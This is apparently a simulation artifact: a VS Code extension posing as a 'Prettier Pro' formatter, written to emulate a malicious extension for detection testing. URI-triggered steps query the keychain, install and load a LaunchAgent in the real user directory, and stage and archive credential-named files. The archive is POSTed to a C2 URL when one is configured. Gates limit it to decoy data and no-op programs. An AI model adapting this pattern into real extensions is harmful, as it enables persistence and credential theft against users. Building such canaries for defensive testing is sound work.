// Prettier Pro — VS Code extension (CORTEXSIM-CANARY artifact, SIM-KOI-009).
//
// Benign by construction. Every path is derived from CORTEXSIM_KOI009_DECOY_ROOT
// (the decoy tree the scenario plants). With that variable unset, nothing
// touches disk: the canary marker goes to stderr and the handler returns.
// Outbound HTTP exists only behind CORTEXSIM_C2_URL (default: no network).
//
// activate()  -> step 02: writes a canary marker, spawns ONE short-lived
//                macOS scripting-interpreter child that exits at once,
//                and registers the URI handler below.
// URI handler (vscode://cortexsim-canary.prettier-pro-canary/<step-id>):
//   /step-03  runs the keychain CLI against the DECOY keychain file only
//             (no login keychain is opened or copied).
//   /step-04  writes a LaunchAgent plist into the user's real LaunchAgents
//             directory (derived from os.homedir(); that location is the
//             persistence signal) and loads it with launchctl bootstrap into
//             the user's gui domain. Its program is /usr/bin/true (a no-op),
//             the label carries the canary string, and scenario cleanup
//             boots it out and deletes it.
//   /step-05  reads the DECOY credential-named files (CORTEXSIM-DECOY values)
//             and copies them into a staging directory in the decoy tree.
//   /step-06  archives the staging directory; sends it only if
//             CORTEXSIM_C2_URL is set, otherwise records the canary
//             destination (cortexsim-canary.invalid) and sends nothing. With
//             C2 unset there is no network call at all, not even a DNS lookup
//             of that host.

"use strict";

const fs = require("fs");
const os = require("os");
const path = require("path");
const cp = require("child_process");
const vscode = require("vscode");

const MARKER = "CORTEXSIM-CANARY";
const CANARY_HOST = "cortexsim-canary.invalid";

function decoyRoot() {
    return (process.env && process.env.CORTEXSIM_KOI009_DECOY_ROOT) || "";
}

function note(msg) {
    console.error(MARKER + " prettier-pro-canary: " + msg);
}

function writeMarker(root, name, body) {
    fs.mkdirSync(root, { recursive: true });
    fs.writeFileSync(path.join(root, name), MARKER + " " + (body || "") + "\n");
}

function run(cmd, args) {
    // Child of the extension host; short-lived and exits on its own.
    try {
        cp.execFile(cmd, args, () => {});
    } catch (_) { /* ignore */ }
}

function step03(root) {
    const keychain = path.join(root, "decoy.keychain-db");
    run("security", ["find-generic-password", "-s", "cortexsim-decoy", keychain]);
}

function step04() {
    const dir = path.join(os.homedir(), "Library", "LaunchAgents");
    const label = "com.cortexsim.canary.koi009";
    const plist = path.join(dir, label + ".plist");
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(plist, [
        '<?xml version="1.0" encoding="UTF-8"?>',
        "<!-- " + MARKER + " -->",
        '<plist version="1.0"><dict>',
        "<key>Label</key><string>" + label + "</string>",
        "<key>ProgramArguments</key><array><string>/usr/bin/true</string></array>",
        "<key>RunAtLoad</key><false/>",
        "</dict></plist>",
        "",
    ].join("\n"));
    const uid = typeof process.getuid === "function" ? process.getuid() : 0;
    run("launchctl", ["bootstrap", "gui/" + uid, plist]);
}

function stagingDir(root) {
    return path.join(root, "staging");
}

function step05(root) {
    const credDir = path.join(root, "creds");
    const staging = stagingDir(root);
    fs.mkdirSync(staging, { recursive: true });
    let names = [];
    try { names = fs.readdirSync(credDir); } catch (_) { /* nothing planted */ }
    for (const name of names) {
        try {
            const data = fs.readFileSync(path.join(credDir, name), "utf8");
            fs.writeFileSync(path.join(staging, name), data);
        } catch (_) { /* ignore */ }
    }
    writeMarker(staging, "staged.marker", "decoy staging");
}

function step06(root) {
    const archive = path.join(root, "staging.tgz");
    cp.execFile("tar", ["-czf", archive, "-C", stagingDir(root), "."], (err) => {
        if (err) return;
        const c2 = (process.env && process.env.CORTEXSIM_C2_URL) || "";
        if (!c2) {
            note("step-06 C2 url unset; would target " + CANARY_HOST + "; nothing sent.");
            return;
        }
        // Actual egress shape; runs only with explicit operator opt-in.
        const url = new URL(c2);
        const proto = url.protocol === "https:" ? require("https") : require("http");
        const req = proto.request({
            hostname: url.hostname,
            port: url.port || (url.protocol === "https:" ? 443 : 80),
            path: url.pathname + url.search,
            method: "POST",
            headers: { "x-cortexsim-canary": "vscode-prettier-pro-canary" },
        }, () => {});
        req.on("error", () => {});
        req.write(MARKER + "\n" + fs.readFileSync(archive).toString("latin1"));
        req.end();
    });
}

const HANDLERS = {
    "/step-03": step03,
    "/step-04": step04,
    "/step-05": step05,
    "/step-06": step06,
};

function handleUri(uri) {
    const root = decoyRoot();
    if (!root) {
        note("DECOY_ROOT unset; trigger " + uri.path + " ignored.");
        return;
    }
    const fn = HANDLERS[uri.path];
    if (!fn) {
        note("unknown step " + uri.path);
        return;
    }
    try {
        writeMarker(root, "trigger" + uri.path.replace("/", "-") + ".marker", "handled");
        fn(root);
    } catch (e) {
        note("step failed: " + (e && e.message));
    }
}

function activate(context) {
    const root = decoyRoot();
    if (root) {
        writeMarker(root, "activated.marker", "step-02");
    } else {
        note("activate(): DECOY_ROOT unset; no marker written.");
    }
    if (process.platform === "darwin") {
        run("osascript", ["-e", 'return "' + MARKER + '"']);
    }
    context.subscriptions.push(vscode.window.registerUriHandler({ handleUri }));
}

function deactivate() {}

module.exports = { activate, deactivate };
